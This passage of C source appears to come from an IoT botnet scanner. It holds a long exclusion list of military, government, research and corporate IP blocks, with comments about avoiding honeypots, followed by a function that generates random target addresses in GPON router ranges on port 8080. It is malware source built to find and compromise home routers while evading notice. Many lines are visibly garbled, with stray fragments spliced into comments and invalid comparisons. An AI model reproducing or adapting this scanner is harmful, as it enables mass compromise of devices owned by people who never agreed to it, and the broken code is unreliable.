		(o1 == 128 && o2 == 39) || // Norwegian Telecommunications Administration (NET-NTANET)
		(o1 == 128 && o2 == 40) || // University College London (NET-UCL-ETHERNET)
		(o1 == 128 && o2 == 41) || // University College London (NET-CL-CS-SERVICE)
		(o1 == 128 && o2 == 42) || // Rice University (NET-RICE-NET)
		(o1 == 128 && o2 == 43) || // Defence Researc
		(o1 == 128 && o2 == 47) || // : Army Communications Electronics Command (NET-TACTNET)
		(o1 == 128 && o2 == 50) || // : Department of Defense (NET-COINS)
		(o1 == 128 && o2 == 51) || // : Department of Defense (NET-COINSTNET)
		(o1 == 128 && o2 == 56) || // : U.) || //S.) || // Naval Academy (NET-USNA-NET)
		(o1 == 128 && o2 == 63) || // : Army Ballistics Research Laboratory (NET-BRL-SUBNET)
		(o1 == 128 && o2 == 80) || // : Army Communications Electronics Command (CECOM) (NET-CECOMNET)
		(o1 == 128 && o2 == 98) || // : Defence Evaluation and Research Agency (NET-DERA-UK)
		(o1 == 128 && o2 == 99) || // Northrop Grumman Corporation - Automation Sciences Laboratory (NET-NORTHROP-NET)
		(o1 == 128 && o2 == 100) || // University of Toronto Computing and Communications (NET-TORONTO)
		(o1 == 128 && o2 == 101) || // University of Minnesota (NET-UMN-NET)
		(o1 == 128 && o2 == 102) || // : NASA Ames Research Center
		(o1 == 128 && o2 == 103) || // Harvard University (NET-HARVA
		(o1 == 128 && o2 == 149) || // : NASA Headquarters
		(o1 == 128 && o2 == 150) || // National Science Foundation (NET-NSF-LAN)
		(o1 == 128 && o2 == 151) || // University of Rochester (NET-UR-NET)
		(o1 == 128 && o2 == 152) || // Hughes Electronics (NET- HAC-ENET)
		(o1 == 128 && o2 == 153) || // Clarkson University (NET-CLARKSON)
		(o1 == 128 && o2 == 154) || // : NASA Wallops Flight Facility (NET-WFF-NET)
		(o1 == 128 && o2 == 155) || // : NASA Langley Research Center (NET-LARC-NET)
		(o1 == 128 && o2 == 156) || // : NASA Lewis Network Control Center (NET- LERC)
		(o1 == 128 && o2 == 157) || // : NASA Johnson Space Center (NET-JSC-NET)
		(o1 == 128 && o2 == 158) || // : NASA Ames Research Center (NET-MSFC-NET)
		(o1 == 128 && o2 == 159) || // : NASA Ames Research Center (NET-KSC-NET)
		(o1 == 128 && o2 == 160) || // : Naval Research Laboratory (NET- SSCNET)
		(o1 == 128 && o2 == 161) || // : NASA Ames Research Center (NET-NSN-NET)
		(o1 == 128 && o2 == 183) || // : NASA Goddard Space Flight Center (NET-GSFC)
		(o1 == 128 && o2 == 190) || // : Army Belvoir Reasearch and Development Center
		(o1 == 128 && o2 == 216) || // : MacDill Air Force Base (NET-CC-PRNET)
		(o1 == 128 && o2 == 217) || // : NASA Kennedy Space Center (NET-NASA-KSC-OIS)
		(o1 == 128 && o2 == 236) || // : U.) || //S.) || // Air Force Academy (NET-USAFA-NET
		(o1 == 129 && o2 == 11) || // : University of Leeds (NET-LEEDS)
		(o1 == 129 && o2 == 12) || // : University of Kent at Canterbury (NET-UKC)
		(o1 == 129 && o2 == 13) || // : University of Karlsruhe
		(o1 == 129 && o2 == 48) || // : Wright-Patterson Air Force Base
		(o1 == 129 && o2 == 50) || // : NASA Marshall Space Flight Center (NET-PSCN)
		(o1 == 129 && o2 == 51) || // : Patrick Air Force Base (NET-NS) PAFB)
		(o1 == 129 && o2 == 52) || // : Wright-Patterson Air Force Base
		(o1 == 129 && o2 == 54) || // : Vandenberg Air Force Base
		(o1 == 129 && o2 == 69) || // : University of Stuttgart (NET-NI-STG-NET)
		(o1 == 129 && o2 == 70) || // : University of Bielefeld
		(o1 == 129 && o2 == 73) || // : Siemens
		(o1 == 129 && o2 == 92) || // : Air Force Institute of Technology
		(o1 == 129 && o2 == 99) || // : NASA Ames Research Center
		(o1 == 129 && o2 == 139) || // : Army Armament Research Development and Engineering Center
		(o1 == 129 && o2 == 163) || // : NASA/Johnson Space Center (NET-NASA-JSCSSE)
		(o1 == 129 && o2 == 164) || // : NASA IVV (NET-E) NASA-IVV)
		(o1 == 129 && o2 == 165) || // : NASA Goddard Space Flight Center (NET-NASA-GSFCSSE)
		(o1 == 129 && o2 == 166) || // : NASA - John F.) || // Kennedy Space Center (NET-NASA-JFKSSE)
		(o1 == 129 && o2 == 167) || // : NASA Marshall Space Flight Center (NET-NASA-MSFCSSE)
		(o1 == 129 && o2 == 168) || // : NASA Lewis Research Center (NET-NASA-LRCSSE)
		(o1 == 129 && o2 == 187) || // : Leibniz-Rechenzentrum der Bayerischen Akademie
		(o1 == 129 && o2 == 198) || // : Air Force Flight Test Center
		(o1 == 129 && o2 == 209) || // : Army Ballistics Research Laboratory
		(o1 == 129 && o2 == 217) || // : University of Dortmund
		(o1 == 129 && o2 == 229) || // : U.) || //S.) || // Army Corps of Engineers
		(o1 == 129 && o2 == 233) || // : Fraunhofer Institut f?r Produktionstechnik u.) || // Automatisierung
		(o1 == 129 && o2 == 251) || // : United States Air Force Academy
		(o1 == 130 && o2 == 40) || // : NASA Johnson Space Center
		(o1 == 130 && o2 == 75) || // : University of Hannover
		(o1 == 130 && o2 == 112) || // : Netherlands Energy Research Foundation ECN
		(o1 == 130 && o2 == 114) || // : Army Aberdeen Proving Ground Installation Support Activity (NET-APGNET)
		(o1 == 130 && o2 == 115) || // : Erasmus University Rotterdam
		(o1 == 130 && o2 == 123) || // : Massey University
		(o1 == 130 && o2 == 133) || // : Freie Universitaet Berlin
		(o1 == 130 && o2 == 165) || // : U.) || //S.) || //Army Corps of Engineers
		(o1 == 130 && o2 == 167) || // : NASA Headquarters
		(o1 == 130 && o2 == 183) || // : Max-Planck-Institut fur Plasmaphysik
		(o1 == 130 && o2 == 211) || // : UUNet
		(o1 == 130 && o2 == 241) || // : Gothenburg University (NET-GU-NET)
		(o1 == 130 && o2 == 247) || // : Boeing Military Aircraft
		(o1 == 131 && o2 == 3) || // : Mather Air Force Base
		(o1 == 131 && o2 == 6) || // : Langley Air Force Base
		(o1 == 131 && o2 == 10) || // : Barksdale Air Force Base
		(o1 == 131 && o2 == 17) || // : Sheppard Air Force Base
		(o1 == 131 && o2 == 21) || // : Hahn Air Base (NET-HAHNNET)
		(o1 == 131 && o2 == 22) || // : Keesler Air Force Base
		(o1 == 131 && o2 == 25) || // : Patrick Air Force Base
		(o1 == 131 && o2 == 35) || // : Fairchild Air Force Base
		(o1 == 131 && o2 == 36) || // : Yokota Air Base
		(o1 == 131 && o2 == 37) || // : Elmendorf Air Force Base
		(o1 == 131 && o2 == 38) || // : Hickam Air Force Base
		(o1 == 131 && o2 == 40) || // : Bergstrom Air Force Base
		(o1 == 131 && o2 == 44) || // : Randolph Air Force Base
		(o1 == 131 && o2 == 47) || // : Andersen Air Force Base
		(o1 == 131 && o2 == 50) || // : Davis-Monthan Air Force Base
		(o1 == 131 && o2 == 54) || // : Air Force Concentrator Network
		(o1 == 131 && o2 == 61) || // : McConnell Air Force Base
		(o1 == 131 && o2 == 62) || // : Norton Air Force Base
		(o1 == 131 && o2 == 92) || // : Army Information Systems Command - Aberdeen
		(o1 == 131 && o2 == 110) || // : NASA/Michoud Assembly Facility
		(o1 == 131 && o2 == 121) || // : United States Naval Academy
		(o1 == 131 && o2 == 122) || // : United States Naval Academy
		(o1 == 131 && o2 == 155) || //) || // [Eindhoven University, Netherlands
		(o1 == 131 && o2 == 169) || // : Deutsches Elektronen Synchrotron
		(o1 == 131 && o2 == 174) || //) || // Nijmegen University, Netherlands
		(o1 == 131 && o2 == 176) || // : European Space Operations Center
		(o1 == 131 && o2 == 182) || // : NASA Headquarters
		(o1 == 131 && o2 == 188) || // : University Erlangen Nuremberg
		(o1 == 131 && o2 == 211) || // : UUNet
		(o1 == 131 && o2 == 220) || // : University of Bonn
		(o1 == 131 && o2 == 236) || // : University College, Australian Defense Force Academy
		(o1 == 131 && o2 == 246) || // : University Kaiserslautern
		(o1 == 132 && o2 == 68) || //) || // [Technological Institute, Israel
		(o1 == 132 && o2 >= 95 && o2 <= 108) || // ???
		(o1 == 134 && o2 == 2) || // : Universitaet Tuebingen
		(o1 == 134 && o2 == 11) || // : The Pentagon (NET-PENTNET)
		(o1 == 134 && o2 == 12) || // : NASA Ames Research Center
		(o1 == 134 && o2 == 21) || // : University of Fribourg
		(o1 == 134 && o2 == 78) || // : Army Information Systems Command-ATCOM
		(o1 == 134 && o2 == 80) || // : Army Information Systems Command
		(o1 == 134 && o2 == 91) || // : Uni Duisburg
		(o1 == 134 && o2 == 95) || // : Uni K?ln
		(o1 == 134 && o2 == 118) || // : NASA/Johnson Space Center
		(o1 == 134 && o2 == 147) || // : Ruhr-Universitaet Bochum
		(o1 == 134 && o2 == 155) || // : University of Mannheim
		(o1 == 134 && o2 == 164) || // : Army Engineer Waterways Experiment Station
		(o1 == 134 && o2 == 176) || // : Universitaet Giessen
		(o1 == 134 && o2 == 194) || // : U.) || //S.) || // Army Aberdeen Test Center
		(o1 == 134 && o2 == 229) || // : Navy Regional Data Automation Center
		(o1 == 134 && o2 == 230) || // : Navy Regional Data Automation Center
		(o1 == 134 && o2 == 240) || // : U.) || //S.) || // Military Academy
		(o1 == 134 && o2 == 245) || // : Universitaet Kiel
		(o1 == 136 && o2 == 156) || // : European Centre for Medium-Range Weather Forecasts
		(o1 == 136 && o2 == 172) || // : Deutsches Klimarechenzentrum
		(o1 == 136 && o2 == 178) || // : NASA Research Network
		(o1 == 136 && o2 == 199) || // : Universitaet Trier
		(o1 == 137 && o2 == 1) || // : Whiteman Air Force Base
		(o1 == 137 && o2 == 2) || // : George Air Force Base
		(o1 == 137 && o2 == 3) || // : Little Rock Air Force Base
		(o1 == 137 && o2 == 5) || // : Air Force Concentrator Network
		(o1 == 137 && o2 == 6) || // : Air Force Concentrator Network
		(o1 == 137 && o2 == 12) || // : Air Force Concentrator Network
		(o1 == 137 && o2 == 223) || // : Siemens Nixdorf Information Systems
		(o1 == 137 && o2 == 226) || // : Aachen University of Technology
		(o1 == 137 && o2 == 240) || // : Air Force Materiel Command
		(o1 == 137 && o2 == 242) || // : Air Force Logistics Command
		(o1 == 137 && o2 == 250) || // : University of Augsburg (NET-AUX)
		(o1 == 137 && o2 == 251) || // : Fraunhofer-Institut f?r Arbeitswirtschaft und Organisation
		(o1 == 138 && o2 == 13) || // : Air Force Systems Command
		(o1 == 138 && o2 == 27) || // : Army Information Systems Command
		(o1 == 138 && o2 == 30) || // : National Space Development Agency of Japan
		(o1 == 138 && o2 == 61) || // : Mainz
		(o1 == 138 && o2 == 76) || // : NASA Headquarters
		(o1 == 138 && o2 == 115) || // : NASA Information and Electronic Systems Laboratory
		(o1 == 138 && o2 == 136) || // : Navy Computers and Telecommunications Station
		(o1 == 138 && o2 == 137) || // : Navy Regional Data Automation Center
		(o1 == 138 && o2 == 139) || // : Marine Corps Air Station
		(o1 == 138 && o2 == 140) || // : Navy Regional Data Automation Center
		(o1 == 138 && o2 == 141) || // : Navy Regional Data Automation Center
		(o1 == 138 && o2 == 142) || // : Navy Regional Data Automation Center
		(o1 == 138 && o2 == 143) || // : Navy Regional Data Automation Center
		(o1 == 138 && o2 == 156) || // : Marine Corps Central Design & Prog.) || // Activity
		(o1 == 138 && o2 == 158) || // : Marine Corps Central Design & Prog.) || // Activity
		(o1 == 138 && o2 == 168) || // : Marine Corps Central Design & Prog.) || // Activity
		(o1 == 138 && o2 == 193) || // : NASA/Yellow Creek
		(o1 == 139 && o2 == 2) || // : University of Dortmund
		(o1 == 139 && o2 == 4) || // : EUnet Deutschland GmbH
		(o1 == 139 && o2 == 5) || // : University of Dortmund
		(o1 == 139 && o2 == 6) || // : Fachhochschule K?ln
		(o1 == 139 && o2 == 7) || // : Mannesmann Mobilfunk GmbH
		(o1 == 139 && o2 == 8) || // : S & P Media GmbH
		(o1 == 139 && o2 >= 10 && o2 <= 16) || // University of Dortmund (NETBLK-UNIDO11) || //)
		(o1 == 139 && o2 == 11) || // : Universit?t der Bundeswehr Hamburg
		(o1 == 139 && o2 == 13) || // : Fachhochschule Wilhelmshaven
		(o1 == 139 && o2 == 14) || // : Universit?t Koblenz-Landau
		(o1 == 139 && o2 == 15) || // : Robert Bosch GmbH
		(o1 == 139 && o2 == 17) || // : Geo-Forschungs-Zentrum Potsdam
		(o1 == 139 && o2 == 18) || // : Universit?t Leipzig (NET-UNILE-LAN)
		(o1 == 139 && o2 == 19) || // : Max-Planck-Institut f?r Informatik
		(o1 == 139 && o2 => 20 && <= 29) || //  : European Regional Internet Registry/RIPE NCC
		(o1 == 139 && o2 == 21) || // : Siemens Business Services
		(o1 == 139 && o2 == 22) || // : Siemens Business Services
		(o1 == 139 && o2 == 23) || // : Siemens Business Services
		(o1 == 139 && o2 == 25) || // : Siemens Business Services
		(o1 == 139 && o2 == 27) || // : Thyssen Stahl AG
		(o1 == 139 && o2 == 28) || // : Bremer Vulkan AG
		(o1 == 139 && o2 == 30) || // : University of Rostock
		(o1 == 139 && o2 == 75) || // : Alfred Wegener Institute for Polar and Marine Research
		(o1 == 139 && o2 == 88) || // : NASA Lewis Research Center
		(o1 == 139 && o2 == 142) || // : Front end portal of a security network filtering hundreds of client subscription IPs.) || // If you find a vulnerable pub, IIS, SQL, or *) || //nix -- LEAVE IT ALONE
		(o1 == 139 && o2 == 161) || // : Army Information Systems Command
		(o1 == 139 && o2 == 169) || // : NASA/Johnson Space Center
		(o1 == 139 && o2 == 229) || // : NASA Ames Research Center
		(o1 == 140 && o2 == 139) || // : HQ US Army Medical Research and Development Command
		(o1 == 140 && o2 == 239 && o3 == 81 && o4 >= 184 && o4 <= 192) || // Marine Biological Laboratory
		(o1 == 141) || // : Fast nur Deutsche Firmen
		(o1 == 144 && o2 == 99) || // United States Army Information Systems Command (NET-CRLSLBKS-NET)
		(o1 == 144 && o2 == 109) || // Army Information Systems Command (NET-NCMBRLNDNET)
		(o1 == 144 && o2 == 143) || // Headquarters, Third United States Army (NET-AC2) || //IS)
		(o1 == 144 && o2 == 144) || // Headquarters, Third United States Army (NET-AC2) || //IS1) || //)
		(o1 == 144 && o2 == 146) || // Commander, Army Information Systems Center (NET-FTIRWIN1) || // )
		(o1 == 144 && o2 == 147) || // Commander, Army Information Systems Center (NET-FTIRWIN2) || // )
		(o1 == 144 && o2 == 192) || // United States Army Information Services Command-Campbell (NET-CAMPBELL-GW1) || //)
		(o1 == 144 && o2 == 232) || //) || // Sprintlink, USA
		(o1 == 144 && o2 == 233) || // Defense Intelligence Agency (NET-DODIIS1) || //)
		(o1 == 144 && o2 == 234) || // Defense Intelligence Agency (NET-DODIIS2) || //)
		(o1 == 144 && o2 == 235) || // Defense Intelligence Agency (NET-DODIIS3) || //)
		(o1 == 144 && o2 == 236) || // Defense Intelligence Agency (NET-DODIIS4) || //)
		(o1 == 144 && o2 == 237) || // Defense Intelligence Agency (NET-DODIIS5) || //)
		(o1 == 144 && o2 == 238) || // Defense Intelligence Agency (NET-DODIIS6) || //)
		(o1 == 144 && o2 == 239) || // Defense Intelligence Agency (NET-DODIIS7) || //)
		(o1 == 144 && o2 == 240) || // Defense Intelligence Agency (NET-DODIIS
		(o1 == 144 && o2 == 241) || // Defense Intelligence Agency (NET-DODIIS9) || //)
		(o1 == 144 && o2 == 242) || // Defense Intelligence Agency (NET-DODIIS10) || //)
		(o1 == 144 && o2 == 247) || // SUPSHIP, Groton, U.) || //S.) || //N.) || // (NET-SOSGNET)
		(o1 == 144 && o2 == 249) || // Air Products and Chemicals Incorporated (NET-APCI-NET)
		(o1 == 144 && o2 == 252) || // U.) || //S.) || // Army LABCOM (NET-LABCOM-ETDL)
		(o1 == 145) || // : Niederlande, Frankreich und Deutschland
		(o1 == 147 && o2 == 103) || // : Army Information Systems Software Center
		(o1 == 147 && o2 == 104) || // : Army Information Systems Software Center
		(o1 == 147 && o2 == 164) || // : Army Information Systems Command
		(o1 == 147 && o2 == 165) || // : Army Information Systems Command
		(o1 == 147 && o2 == 198) || // : Army Information Systems Command
		(o1 == 147 && o2 == 199) || // : Army Information Systems Command
		(o1 == 147 && o2 == 238) || // : Army Information Systems Command
		(o1 == 147 && o2 == 240) || // : US Army Tank-Automotive Command
		(o1 == 147 && o2 == 251) || //) || // [ContacTel, Czech Republic
		(o1 == 149 && o2 == 201) || // : Fachhochschule Aachen (NET-HAC-LAN)
		(o1 == 149 && o2 == 202) || // : Siemens Nixdorf Informationssysteme AG
		(o1 == 149 && o2 == 202) || // : European Regional Internet Registry/RIPE NCC
		(o1 == 149 && o2 == 203) || // : Medizinische Akademie Magdeburg
		(o1 == 149 && o2 == 204) || // : Alcanet International Deutschland GmbH
		(o1 == 149 && o2 == 205) || // : FH Merseburg
		(o1 == 149 && o2 == 206) || // : Thyssen Stahl AG
		(o1 == 149 && o2 == 206) || // : European Regional Internet Registry/RIPE NCC
		(o1 == 149 && o2 == 207) || // : Telefunken Systemtechnik Ulm
		(o1 == 149 && o2 == 211) || // : Thyssen Stahl AG
		(o1 == 149 && o2 == 212) || // : Siemens-Nixdorf Informationssystemer A/S
		(o1 == 149 && o2 == 216) || // : Degussa AG
		(o1 == 149 && o2 == 217) || // : Max-Planck-Institut f?r Kernphysik
		(o1 == 149 && o2 == 218) || // : Hirschmann GmbH & Co
		(o1 == 149 && o2 == 219) || // : Westdeutscher Rundfunk Koeln
		(o1 == 149 && o2 == 220) || // : Forschungszentrum Rossendorf
		(o1 == 149 && o2 == 221) || // : Rheinisch Bergische Presse-Data GmbH
		(o1 == 149 && o2 == 222) || // : Fachhochschule Kiel
		(o1 == 149 && o2 == 232) || // : Quantum Software GmbH
		(o1 == 149 && o2 == 233) || // : Lahmeyer International GmbH
		(o1 == 149 && o2 == 234) || // : Schering AG Berlin
		(o1 == 149 && o2 == 235) || // : iXOS Software GmbH
		(o1 == 149 && o2 == 236) || // : Bruker Analytische Messtechnik GmbH
		(o1 == 149 && o2 == 237) || // : Wiechers & Partner Datentechnik GmbH
		(o1 == 149 && o2 == 238) || // : ZF Friedrichshafen AG
		(o1 == 149 && o2 == 239) || // : European Regional Internet Registry/RIPE NCC
		(o1 == 149 && o2 == 240) || // : Carl Schenk AG
		(o1 == 149 && o2 == 242) || // : Koerber AG
		(o1 == 149 && o2 == 243) || // : ERNO Raumfahrttechnik
		(o1 == 149 && o2 == 244) || // : Knorr-Bremse AG, M?nchen
		(o1 == 149 && o2 == 246) || // : Siemens AG, OeN NKE A2) || //
		(o1 == 149 && o2 == 248) || // : TA Triumph-Adler AG
		(o1 == 149 && o2 == 250) || // : Hoechst AG, Frankfurt
		(o1 == 149 && o2 == 251) || // : Electricite de France - Direction Etudes Recherche
		(o1 == 149 && o2 == 252) || // : USDOE, NV Operations Office
		(o1 == 149 && o2 == 253) || // : DIRM/ITD
		(o1 == 149 && o2 == 254) || // : Mercury Personal Communications, Ltd.) || //
		(o1 == 149 && o2 == 99 && o3 >= 130 && o3 <= 150) || // : Kanadischer Provider
		(o1 == 145 && o2 == 253) || // : Arcor
		(o1 == 149 && o2 == 225) || // : MSN
		(o1 == 150 && o2 == 144) || // : NASA Goodard Space Flight Center
		(o1 == 150 && o2 == 149) || // : Army Information Systems Command
		(o1 == 150 && o2 == 197) || // : Korea Aerospace Research Institute
		(o1 == 151 && o2 == 3) || // IUnet (NET-IUNET-BNET3) || //)
		(o1 == 152 && o2 == 203) || // : Compuserv
		(o1 == 152 && o2 == 166) || // : AOL
		(o1 == 152 && o2 == 170) || // : AOL
		(o1 == 152 && o2 == 172) || // : AOL
		(o1 == 152 && o2 == 205) || // : AOL
		(o1 == 152 && o2 == 207) || // : AOL
		(o1 == 153 && o2 == 92) || // : Deutsches Forschungsnetz
		(o1 == 153 && o2 == 93) || // : Bundesanstalt f?r Wasserbau
		(o1 == 153 && o2 == 94) || // : Transtec AG
		(o1 == 153 && o2 == 96) || // : Fraunhofer Institut f?r Informations- und Datenverarbeitung IITB
		(o1 == 153 && o2 == 97) || // : Fraunhofer Institut f?r Informations- und Datenverarbeitung IITB
		(o1 == 153 && o2 == 98) || // : Eurocontrol Karlsruhe
		(o1 == 153 && o2 == 99) || // : European Regional Internet Registry/RIPE NCC
		(o1 == 153 && o2 == 100) || // : RWE Energie AG
		(o1 == 153 && o2 == 101) || // : European Regional Internet Registry/RIPE NCC
		(o1 == 155 && o2 == 7) || // : American Forces Information (NET-AFISHQ-NET1) || //)
		(o1 == 155 && o2 == 8) || // : U.) || //S.) || // ArmyFort Gordon (NET-GORDON-NET5) || //)
		(o1 == 155 && o2 == 9) || // : United States Army Information Systems Command (NET-LWOOD-NET2) || //)
		(o1 == 155 && o2 == 74) || // : PEO STAMIS (NET-CEAP2) || //)
		(o1 == 155 && o2 == 75) || // : US Army Corps of Engineers (NET-CEAP3) || //)
		(o1 == 155 && o2 == 76) || // : PEO STAMIS (NET-CEAP4) || //)
		(o1 == 155 && o2 == 77) || // : PEO STAMIS (NET-CEAP5) || //)
		(o1 == 155 && o2 == 78) || // : PEO STAMIS (NET-CEAP6) || //)
		(o1 == 155 && o2 == 79) || // : US Army Corps of Engineers (NET-CEAP7) || //)
		(o1 == 155 && o2 == 80) || // : PEO STAMIS (NET-CEAP
		(o1 == 155 && o2 == 81) || // : PEO STAMIS (NET-CEAP9) || //)
		(o1 == 155 && o2 == 82) || // : PEO STAMIS (NET-CEAP10) || //)
		(o1 == 155 && o2 == 83) || // : US Army Corps of Enginers (NET-CEAP11) || //)
		(o1 == 155 && o2 == 84) || // : PEO STAMIS (NET-CEAP12) || //)
		(o1 == 155 && o2 == 85) || // : PEO STAMIS (NET-CEAP13) || //)
		(o1 == 155 && o2 == 86) || // : US Army Corps of Engineers (NET-CEAP14) || //)
		(o1 == 155 && o2 == 87) || // : PEO STAMIS (NET-CEAP15) || //)
		(o1 == 155 && o2 == 88) || // : PEO STAMIS (NET-CEAP16) || //)
		(o1 == 155 && o2 == 178) || // : Federal Aviation Administration (NET-FAA)
		(o1 == 155 && o2 == 213) || // : USAISC Fort Benning (NET-FTBENNNET3) || //
		(o1 == 155 && o2 == 214) || // : Director of Information Management (NET-CARSON-TCACC )
		(o1 == 155 && o2 == 215) || // : USAISC-FT DRUM (NET-DRUM-TCACCIS)
		(o1 == 155 && o2 == 216) || // : TCACCIS Project Management Office (NET-FTDIX-TCACCI)
		(o1 == 155 && o2 == 217) || // : Directorate of Information Management (NET- EUSTIS-EMH1) || //)
		(o1 == 155 && o2 == 218) || // : USAISC (NET-WVA-EMH2) || //)
		(o1 == 155 && o2 == 219) || // : DOIM/USAISC Fort Sill (NET-SILL-TCACCIS)
		(o1 == 155 && o2 == 220) || // : USAISC-DOIM (NET-FTKNOX-NET4) || //)
		(o1 == 155 && o2 == 221) || // : USAISC-Ft Ord (NET-FTORD-NET2) || //)
		(o1 == 156) || // : US Courts, Siemens, State of Minnesota
		(o1 == 158 && o2 == 3) || // : U.) || //S.) || // Army TACOM
		(o1 == 158 && o2 == 8) || // : US Army Soldier Support Center
		(o1 == 158 && o2 == 12) || // : US Army Harry Diamond Laboratories
		(o1 == 159 && o2 == 1) || // : Washington State Dept.) || // of State and Ind.) || //
		(o1 == 159 && o2 == 206) || // : Air Canada
		(o1 == 160 && o2 == 46) || // : BMW AG, Berlin production plant
		(o1 == 160 && o2 == 47) || // : BMW AG, Dingolfingen production plant
		(o1 == 160 && o2 == 48) || // : BMW AG, Landshut production plant
		(o1 == 160 && o2 == 49) || // : BMW AG, Munich production plant
		(o1 == 160 && o2 == 50) || // : BMW AG, Munich research and admin.) || // sites
		(o1 == 160 && o2 == 51) || // : BMW AG, Regensburg production plant
		(o1 == 160 && o2 == 52) || // : BMW AG, Steyr production plant
		(o1 == 160 && o2 == 132) || // : US Army Recruiting Command
		(o1 == 163 && o2 == 12) || // : Navy Aviation Supply Office
		(o1 == 164 && (o2 == 59 || o2 == 60)) || // : Schering AG (NETBLK-TBLK-SCHERING)
		(o1 == 164 && o2 == 60) || // : Schering AG (NET-SCHERING2) || //)
		(o1 == 164 && o2 == 61) || // : Kaufhof Holding AG, Koeln
		(o1 == 164 && o2 == 224) || // : Secretary of the Navy (NET-SECNAV-LAN)
		(o1 == 164 && o2 == 225) || // : U.) || //S.) || // Army Intelligence and Security Command
		(o1 == 164 && o2 == 231) || // : Military Sealift Command
		(o1 == 169) || // windows default
		(o1 == 169 && o2 == 120) || // : J.) || // P.) || // Morgan & Co (USA)
		(o1 == 171 && o2 == 224) || // : AOL Deutschland
		(o1 == 171 && o2 == 223) || // : ???
		(o1 == 172 && o2 == 16) || //) || // [XS4) || //ALL, Netherlands
		(o1 == 172 && o2 >= 128 && o2 <= 180) || // : America Online, Inc.) || //
		(o1 == 192 && o2 == 114 && o3 == 63) || // : Netvision
		(o1 == 192 && o2 == 168) || //) || // [private network
		(o1 == 193) || // : lahm
		(o1 == 193 && o2 == 79 && o3 == 178) || // : UUNet
		(o1 == 193 && o2 == 101 && o3 == 100) || //:Siemens
		(o1 == 193 && o2 == 122 && o3 == 199) || //:SONNET (Flatrate) (TOT)
		(o1 == 193 && o2 == 159) || // : T-Online
		(o1 == 193 && o2 == 189 && o3 == 224) || // :Siemens
		(o1 == 193 && o2 == 189 && o3 == 231) || // :Siemens
		(o1 == 193 && o2 == 190 && o3 == 215) || //:SONNET (Flatrate) (TOT)
		(o1 == 194 && o2 == 8.193) || // : Net-Cologne
		(o1 == 194 && o2 == 8.197) || // : Net-Cologne
		(o1 == 194 && o2 == 31.232) || // : DE-CIX
		(o1 == 194 && o2 == 90) || // : Netvision
		(o1 == 194 && o2 == 100) || //) || // MBinternet, Finland
		(o1 == 194 && o2 == 121 && o3 == 59) || // : Microsoft
		(o1 == 194 && o2 == 174 && o3 == 230) || //:Siemens
		(o1 == 194 && o2 == 179 && o3 == 124) || //:Microsoft
		(o1 == 194 && o2 == 203 && o3 == 122) || //:UUNet
		(o1 == 194 && o2 == 230) || // : PLUSNET AG (Schweitz)
		(o1 == 195 && o2 == 3) || // : T-Online
		(o1 == 195 && o2 == 7 && o3 == 49) || // : Siemens
		(o1 == 195 && o2 == 10) || // : (FBI's honeypot)
		(o1 == 195 && o2 == 40 && o3 == 101) || // : Siemens
		(o1 == 195 && o2 == 66) || //) || // Sonera, Netherlands
		(o1 == 195 && o2 == 86) || //) || // Chello/Capacity, Netherlands
		(o1 == 195 && o2 == 93) || // : AOL Deutschland
		(o1 == 195 && o2 == 130) || //) || // [Pandora, Belgium
		(o1 == 195 && o2 == 186) || // : Bluewin (Schweiz)
		(o1 == 195 && o2 == 238 && o3 == 160) || // :SONNET (Flatrate) (TOT)
		(o1 == 195 && o2 == 238 && o3 == 164) || // :SONNET (Flatrate) (TOT)
		(o1 == 195 && o2 == 238 && o3 == 163) || // :SONNET (Flatrate) (TOT)
		(o1 == 195 && o2 == 238 && o3 == 174) || //:SONNET (Flatrate) (TOT)
		(o1 == 199 && o2 == 31) || // : US Army Information Systems Command
		(o1 == 199 && o2 == 203 && o3 == 4) || // : Netvision
		(o1 == 199 && o2 == 203 && o3 == 230) || //:Microsoft
		(o1 == 204 && o2 == 34 && o3 == 138) || // GSI (NET-GSI-13) || //
		(o1 == 204 && o2 == 34 && o3 == 139) || // HQ, JFMO Korea, Headquarters (NET-JFMO-KOREA)
		(o1 == 204 && o2 == 34 && o3 == 140) || // DISA D75) || // (NET-TPOCNET)
		(o1 == 204 && o2 == 34 && o3 == 141) || // U.) || // S.) || // Naval Air Facility, Atsugi Japan (NET-NAFATSUGI01) || //)
		)
		return false;
	return true;
}

void GPON8080_IPGen()
{
	char gpon_ip1[16] = {0};char gpon_ip2[16] = {0};char gpon_ip3[16] = {0};
	char gpon_ip4[16] = {0};char gpon_ip5[16] = {0};char gpon_ip6[16] = {0};
	
	srand(time(NULL));
	int gpon_range1 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range2 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range3 = rand() % (sizeof(GPON1_Range)/sizeof(char *));
	int gpon_range4 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range5 = rand() % (sizeof(GPON1_Range)/sizeof(char *));int gpon_range6 = rand() % (sizeof(GPON1_Range)/sizeof(char *));
	
	ipState[0] = GPON1_Range[gpon_range1];ipState[4] = GPON1_Range[gpon_range2];ipState[8] = GPON1_Range[gpon_range3];
	ipState[12] = GPON1_Range[gpon_range4];ipState[16] = GPON1_Range[gpon_range5];ipState[20] = GPON1_Range[gpon_range6];
	ipState[1] = rand() % 255;ipState[2] = rand() % 255;ipState[3] = rand() % 255;ipState[5] = rand() % 255;ipState[6] = rand() % 255;ipState[7] = rand() % 255;
	ipState[9] = rand() % 255;ipState[10] = rand() % 255;ipState[11] = rand() % 255;ipState[13] = rand() % 255;ipState[14] = rand() % 255;ipState[15] = rand() % 255;
	ipState[17] = rand() % 255;ipState[18] = rand() % 255;ipState[19] = rand() % 255;ipState[21] = rand() % 255;ipState[22] = rand() % 255;ipState[23] = rand() % 255;
	
	if(!checkip(ipState[0], ipState[1], ipState[2], ipState[3])
		|| !checkip(ipState[8], ipState[9], ipState[10], ipState[11])
		|| !checkip(ipState[16], ipState[17], ipState[18], ipState[19]))
		GPON8080_IPGen();

	sprintf(gpon_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);sprintf(gpon_ip2, "%d.%d.%d.%d", ipState[4], ipState[5], ipState[6], ipState[7]);
	sprintf(gpon_ip3, "%d.%d.%d.%d", ipState[8], ipState[9], ipState[10], ipState[11]);sprintf(gpon_ip4, "%d.%d.%d.%d", ipState[12], ipState[13], ipState[14], ipState[15]);
	sprintf(gpon_ip5, "%d.%d.%d.%d", ipState[16], ipState[17], ipState[18], ipState[19]);sprintf(gpon_ip6, "%d.%d.%d.%d", ipState[20], ipState[21], ipState[22], ipState[23]);
	
